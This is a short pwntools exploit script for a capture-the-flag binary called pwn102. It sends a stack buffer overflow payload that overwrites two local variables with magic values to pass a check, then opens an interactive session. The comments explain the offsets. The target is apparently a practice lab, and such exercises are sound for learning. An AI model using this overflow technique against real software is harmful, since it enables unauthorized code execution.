from pwn import *

r = process('./pwn102-1644307392479.pwn102')
# r = remote('10.201.26.151', 9002)

# RBP - 120 for input
# RBP - 12 rewrite with c0ff33
# RBP - 16 rewrite with c0d3

# dword ptr [RBP + local_10],0xc0d3
# Yes its only comparing 2 byte but its still dword, so it must be 4 byte
# so what happen in memory it will look like 0000c0d3 -> 4 byte now

# Use p32 because dword -> 4 byte -> 32 bit -> p32
payload = b'A' * 0x68 + p32(0xc0d3) + p32(0xc0ff33)
r.recv()
r.sendline(payload)
r.interactive()
